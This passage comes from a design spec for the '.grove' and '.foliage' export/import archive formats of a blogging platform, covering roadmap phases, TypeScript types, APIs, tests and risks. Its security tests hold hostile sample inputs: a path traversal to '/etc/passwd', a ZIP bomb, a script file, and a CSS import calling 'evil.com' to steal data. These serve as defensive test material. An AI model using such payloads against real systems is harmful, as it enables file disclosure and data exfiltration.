- Add `.grove` Content-Type and Content-Disposition headers
- Extend rate limiting for larger exports (ZIP takes longer)
- Update audit logging with new format type

**Modified:** `libs/engine/src/routes/api/export/+server.ts`
**Added:** `libs/engine/package.json` (grove-format dependency)

### Phase 3: Public Viewer

_`grove.place/open` client-side viewer_

- Build viewer page at `apps/landing/src/routes/open/+page.svelte`
- Implement drag-and-drop with file validation
- Client-side ZIP extraction in Web Worker
- Post/page browser with Markdown rendering
- Media gallery with lazy loading
- Theme preview for `.foliage` files
- PWA file_handlers in manifest.json

### Phase 4: Import

_New `/api/import` endpoint for .grove files_

- Build `/api/import` POST endpoint
- Parse and validate uploaded `.grove` file
- Create/update posts, pages from archive content
- Upload media files to R2 from archive
- Rewrite media URLs to new tenant's paths
- Apply theme settings
- Conflict resolution: merge vs. replace strategy
- Import progress tracking (for large archives)

### Phase 5: Standard Formats

_Markdown ZIP and HTML archive converters_

- `groveToMarkdown()` — transform, date-prefix, generate README
- `groveToHTML()` — render markdown, wrap in templates, generate index
- Add format options to export API: `"markdown-zip"`, `"html-archive"`
- `grove.css` minimal stylesheet

### Phase 6: Foliage Integration

_Wire .foliage into Foliage system and future Terrarium_

- Export community themes as `.foliage` files
- Import `.foliage` files as community themes
- Foliage Library browse/preview with `.foliage` support
- Terrarium export hook (when Terrarium ships)
- Theme round-trip validation

### Phase 7: OS Integration

_PWA file_handlers, custom icons, MIME registration_

- Custom file icons for `.grove` and `.foliage`
- PWA `file_handlers` registration (Phase 3 starts this)
- IANA MIME type registration: `application/vnd.autumnsgrove.grove`, `application/vnd.autumnsgrove.foliage`
- OS-level file association documentation
- `gw export` and `gw import` CLI commands

---

## TypeScript Interfaces

### Core Types

```typescript
/** Supported Grove file format types */
type GroveFormatType = "grove" | "foliage";

/** Options for creating a .grove file */
interface CreateGroveOptions {
	/** Tenant data from D1 */
	tenant: {
		subdomain: string;
		displayName: string;
		plan: string;
	};
	/** Posts to include (Markdown + metadata) */
	posts: GrovePost[];
	/** Pages to include */
	pages: GrovePage[];
	/** Media files to include (binary data + metadata) */
	media: GroveMediaFile[];
	/** Theme settings */
	theme?: GroveThemeExport;
	/** Site settings from tenant_settings */
	siteSettings?: Record<string, unknown>;
	/** Curio configurations (non-secret fields only) */
	curios?: Record<string, unknown>;
}

/** A post as represented in a .grove file */
interface GrovePost {
	slug: string;
	title: string;
	description: string | null;
	content: string;
	status: "draft" | "published" | "archived";
	tags: string[];
	featuredImage: string | null;
	wordCount: number;
	readingTime: number;
	gutterContent: unknown[];
	publishedAt: string | null;
	createdAt: string;
	updatedAt: string;
}

/** A page as represented in a .grove file */
interface GrovePage {
	slug: string;
	title: string;
	description: string | null;
	content: string;
	type: string;
	font: string;
	hero: unknown | null;
	gutterContent: unknown[];
	createdAt: string;
	updatedAt: string;
}

/** A media file with binary data for inclusion in archive */
interface GroveMediaFile {
	filename: string;
	originalName: string;
	path: string;
	data: Uint8Array;
	size: number;
	mimeType: string;
	altText: string | null;
	width: number | null;
	height: number | null;
	uploadedAt: string;
}

/** Theme data exported in a .grove file */
interface GroveThemeExport {
	settings: ThemeSettings;
	thumbnail: Uint8Array | null;
	customFonts: GroveCustomFont[];
}

/** A custom font bundled in the archive */
interface GroveCustomFont {
	name: string;
	family: string;
	category: "sans-serif" | "serif" | "mono" | "display";
	data: Uint8Array;
	fileSize: number;
}
```

### Manifest Types

```typescript
/** .grove manifest (manifest.grove) */
interface GroveManifest {
	format: "grove";
	formatVersion: string;
	minReaderVersion: string;
	generatedBy: string;
	createdAt: string;

	grove: {
		subdomain: string;
		displayName: string;
		plan: string;
	};

	contents: {
		posts: number;
		pages: number;
		mediaFiles: number;
		mediaBytes: number;
		customFonts: number;
		curios: string[];
	};

	checksums: {
		algorithm: "sha256";
		manifest: string;
		contentIndex?: string;
	};
}

/** .foliage manifest (manifest.foliage) */
interface FoliageManifest {
	format: "foliage";
	formatVersion: string;
	minReaderVersion: string;
	generatedBy: string;
	createdAt: string;

	theme: {
		id: string;
		name: string;
		description: string;
		tags: string[];
		baseTheme?: string;
	};

	contents: {
		hasCustomCSS: boolean;
		customCSSBytes: number;
		customFonts: number;
		screenshots: number;
		hasThumbnail: boolean;
	};

	checksums: {
		algorithm: "sha256";
		manifest: string;
	};
}
```

### Parse Result Types

```typescript
/** Result of parsing a .grove file */
interface ParsedGroveFile {
	manifest: GroveManifest;
	posts: GrovePost[];
	pages: GrovePage[];
	media: GroveMediaEntry[];
	theme: ParsedTheme | null;
	siteSettings: Record<string, unknown>;
	curios: Record<string, unknown>;
	exportInfo: ExportInfo;
}

/** Media entry from parsed archive (binary data loaded on demand) */
interface GroveMediaEntry {
	filename: string;
	originalName: string;
	path: string;
	size: number;
	mimeType: string;
	altText: string | null;
	width: number | null;
	height: number | null;
	uploadedAt: string;
	/** Retrieve the binary data (lazy — only loaded when accessed) */
	getData: () => Promise<Uint8Array>;
}

/** Result of parsing a .foliage file */
interface ParsedFoliageFile {
	manifest: FoliageManifest;
	theme: Theme;
	customCSS: string | null;
	fonts: FoliageFont[];
	thumbnail: Uint8Array;
	screenshots: Uint8Array[];
	author: FoliageAuthor;
	compatibility: FoliageCompatibility;
}

/** Options for parsing */
interface ParseOptions {
	/** Skip media binary extraction (for quick manifest inspection) */
	manifestOnly?: boolean;
	/** Maximum total extraction size in bytes */
	maxTotalSize?: number;
	/** Validate checksums during extraction */
	validateChecksums?: boolean;
}
```

### Foliage Types (from Foliage spec)

```typescript
/** Full theme definition (matches Foliage spec) */
interface Theme {
	id: string;
	name: string;
	description: string;
	thumbnail: string;
	tier: "seedling" | "sapling";

	colors: ThemeColors;
	fonts: ThemeFonts;
	layout: ThemeLayout;
	glass?: ThemeGlass;
	seasonal?: ThemeSeasonal;
	customCSS?: string;
}

interface ThemeColors {
	background: string;
	surface: string;
	foreground: string;
	foregroundMuted: string;
	accent: string;
	border: string;
}

interface ThemeFonts {
	heading: string;
	body: string;
	mono: string;
}

interface ThemeLayout {
	type: "sidebar" | "no-sidebar" | "centered" | "full-width" | "grid" | "masonry";
	maxWidth: string;
	spacing: "compact" | "comfortable" | "spacious";
}

interface ThemeGlass {
	enabled: boolean;
	opacity: number;
	blur: number;
}

interface ThemeSeasonal {
	enabled: boolean;
	variants: Record<string, Partial<ThemeColors>>;
}

interface ThemeSettings {
	tenantId: string;
	themeId: string;
	accentColor: string;
	customizerEnabled: boolean;
	customColors?: Partial<ThemeColors>;
	customTypography?: Partial<ThemeFonts>;
	customLayout?: Partial<ThemeLayout>;
	customCSS?: string;
	communityThemeId?: string;
}

interface CustomFont {
	id: string;
	tenantId: string;
	name: string;
	family: string;
	category: "sans-serif" | "serif" | "mono" | "display";
	woff2Path: string;
	woffPath?: string;
	fileSize: number;
}
```

---

## Integration Points

### Existing Export API

**File:** `libs/engine/src/routes/api/export/+server.ts`

The existing export API returns JSON only. Phase 2 extends it:

```typescript
// Extended ExportRequest
interface ExportRequest {
	type: ExportType; // "full" | "posts" | "media" | "pages"
	format?: ExportFormat; // "json" | "grove" | "markdown-zip" | "html-archive"
}

type ExportFormat = "json" | "grove" | "markdown-zip" | "html-archive";
```

When `format` is `"grove"`:

1. Query posts, pages, media metadata from D1 (same as today)
2. Download media binaries from R2 (new — current export skips this)
3. Query theme settings and curio configs (new)
4. Pass all data to `createGroveFile()` from `@autumnsgrove/grove-format`
5. Return ZIP binary with appropriate headers

```typescript
// New response for .grove format
return new Response(groveZipBuffer, {
	status: 200,
	headers: {
		"Content-Type": "application/x-grove",
		"Content-Disposition": `attachment; filename="${subdomain}.grove"`,
		"Cache-Control": "no-cache",
		...rateLimitHeaders(rateLimitResult, EXPORT_RATE_LIMIT.limit),
	},
});
```

### New Import API

**File:** `libs/engine/src/routes/api/import/+server.ts` (new)

```
POST /api/import
Content-Type: multipart/form-data

Body: { file: .grove file, strategy: "merge" | "replace" }
```

The import endpoint:

1. Validates auth, CSRF, rate limit
2. Reads uploaded file
3. Calls `parseGroveFile()` with validation
4. Based on strategy:
   - **Merge:** Add new content, skip conflicts by slug
   - **Replace:** Clear existing content, import everything
5. Creates posts/pages in D1
6. Uploads media to R2
7. Applies theme settings
8. Returns import summary

### Landing Package

**Files modified:**

- `apps/landing/src/routes/open/+page.svelte` (new page)
- `apps/landing/static/manifest.json` (add `file_handlers`)

The viewer page imports `@autumnsgrove/grove-format` for client-side parsing and uses existing engine UI components for rendering (GlassCard, Markdown renderer, etc.).

### Foliage System

When Foliage is extracted as `@autumnsgrove/foliage`, the `.foliage` format becomes its native export. Until then, the format library defines its own compatible types and validation functions that will be reconciled during Foliage extraction.

### Future: `gw` CLI

```bash
# Export your grove
gw export --format grove --output my-grove.grove

# Export as markdown
gw export --format markdown --output my-content.zip

# Import a grove file
gw import --write my-grove.grove --strategy merge

# Inspect a file
gw inspect my-grove.grove
```

---

## Testing Strategy

### Unit Tests

| Area                | Tests                                                                     |
| ------------------- | ------------------------------------------------------------------------- |
| **Manifest**        | Schema validation, version comparison, checksum verification              |
| **ZIP creation**    | Manifest-first ordering, compression modes, file count limits             |
| **ZIP extraction**  | Path validation, size limits, bomb detection, ratio checks                |
| **URL rewriting**   | Absolute→relative, relative→absolute, edge cases (no media, nested paths) |
| **Frontmatter**     | YAML serialization round-trip, all field types, null handling             |
| **CSS validation**  | Blocked patterns, allowed patterns, size limits                           |
| **Font validation** | Magic bytes, size limits, format checks                                   |
| **Contrast checks** | WCAG AA pass/fail for various color pairs                                 |
| **Conversion**      | Markdown output format, HTML template rendering, README generation        |

### Round-Trip Tests

The most critical test: create a `.grove` file from test data, parse it back, and verify every field matches:

```typescript
test("grove round-trip preserves all data", async () => {
	const original = createTestGroveData();
	const zipBuffer = await createGroveFile(original);
	const parsed = await parseGroveFile(zipBuffer);

	expect(parsed.posts).toEqual(original.posts);
	expect(parsed.pages).toEqual(original.pages);
	expect(parsed.siteSettings).toEqual(original.siteSettings);
	// Media compared by metadata (binary data checked via checksums)
	expect(parsed.media.map((m) => m.filename)).toEqual(original.media.map((m) => m.filename));
});
```

Same for `.foliage`:

```typescript
test("foliage round-trip preserves theme", async () => {
	const original = createTestFoliageData();
	const zipBuffer = await createFoliageFile(original);
	const parsed = await parseFoliageFile(zipBuffer);

	expect(parsed.theme).toEqual(original.theme);
	expect(parsed.customCSS).toEqual(original.customCSS);
});
```

### Security Tests

```typescript
test("rejects path traversal attempts", async () => {
	const malicious = createZipWithPath("../../../etc/passwd");
	await expect(parseGroveFile(malicious)).rejects.toThrow("Invalid path");
});

test("rejects ZIP bombs", async () => {
	const bomb = createZipBomb(1_000_000_000); // 1GB expanded
	await expect(parseGroveFile(bomb)).rejects.toThrow("exceeds maximum");
});

test("rejects executable files", async () => {
	const withScript = createZipWithFile("hack.js", "alert(1)");
	await expect(parseGroveFile(withScript)).rejects.toThrow("Forbidden file type");
});

test("sanitizes CSS in foliage", async () => {
	const theme = createFoliageWithCSS('@import url("https://evil.com/steal.css")');
	await expect(parseFoliageFile(theme)).rejects.toThrow("CSS validation");
});
```

### Integration Tests

- Export from test D1 database → parse resulting `.grove` file → verify content matches DB
- Import `.grove` file into empty D1 → verify all rows created correctly
- Import `.grove` file with existing content (merge strategy) → verify no duplicates
- Open `.grove` file in viewer → verify all tabs render content
- Full lifecycle: create grove → export → import to new tenant → export again → compare

---

## Accessibility

### `grove.place/open` Viewer

- **Keyboard navigation:** All interactive elements focusable, tab order follows visual order
- **Screen reader support:** File drop zone has `aria-label`, extraction progress announced via `aria-live`
- **Post browser:** Semantic headings, `<article>` wrappers, proper heading hierarchy
- **Media gallery:** All images have `alt` text from media metadata (falls back to filename)
- **Theme preview:** Color swatches include text labels, not just visual color
- **Tab interface:** Uses `role="tablist"` / `role="tab"` / `role="tabpanel"` with `aria-selected`
- **Error states:** Clear error messages when file is invalid, focus moved to error
- **Reduced motion:** No animations in the viewer by default, respects `prefers-reduced-motion`
- **Touch targets:** All buttons minimum 44×44px

### HTML Archive Export

- Semantic HTML throughout (`<article>`, `<header>`, `<nav>`, `<time>`, `<main>`)
- Valid `lang` attribute on `<html>`
- Skip-to-content link on index page
- Sufficient color contrast in `grove.css` (WCAG AA)
- Responsive design in `grove.css` — readable on mobile
- Proper heading hierarchy (no skipped levels)

---

## Success Metrics

| Metric                    | Target                                         | Measurement                                           |
| ------------------------- | ---------------------------------------------- | ----------------------------------------------------- |
| **Round-trip fidelity**   | 100%                                           | Automated: export → import produces identical content |
| **Export speed**          | < 30s for 100 posts + 50 media files           | Benchmark in CI                                       |
| **Parse speed (browser)** | < 5s for 100 MB .grove file                    | Performance test in viewer                            |
| **Security**              | Zero Zip Slip or injection vulnerabilities     | Fuzzing + security test suite                         |
| **WCAG compliance**       | AA for viewer and HTML export                  | Automated + manual audit                              |
| **Format adoption**       | 20% of active Wanderers export within 3 months | Analytics                                             |
| **Viewer engagement**     | 50+ unique viewers/month within 6 months       | Rings analytics                                       |

---

## Risks & Mitigations

| Risk                                   | Impact                                    | Mitigation                                                                                           |
| -------------------------------------- | ----------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Large media exports timeout on Workers | Export fails for media-heavy groves       | Stream ZIP creation, use R2 presigned URLs for large files, consider Durable Object for long exports |
| Format version drift                   | Old .grove files can't be imported        | Strict `minReaderVersion` checking, migration functions between versions                             |
| CSS injection via .foliage             | XSS on blogs using community themes       | Strict CSS sanitization, CSP headers, sandboxed preview                                              |
| Malicious .grove files                 | Data corruption or XSS on import          | Full validation pipeline, no raw HTML import, sanitize markdown                                      |
| Worker memory limits                   | 128MB Worker limit exceeded by large ZIPs | Streaming extraction with fflate, process media files one at a time                                  |
| MIME type conflicts                    | OS associates .grove with another app     | Include magic bytes identifier in manifest, document file association                                |

---

## References

- [EPUB Open Container Format 3.2](https://www.w3.org/publishing/epub3/epub-ocf.html) — inspiration for manifest-first pattern
- [Foliage — Theme System](./foliage-project-spec.md) — theme types and validation
- [Terrarium — Creative Canvas](./terrarium-spec.md) — future .foliage integration
- [Curios — Interactive Experiences](./curios-spec.md) — curio configuration export format
- [PWA File Handling API](https://developer.mozilla.org/en-US/docs/Web/Manifest/file_handlers) — OS-level file association
- [fflate](https://github.com/101arrowz/fflate) — ZIP library for Workers + browsers
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — security guidelines
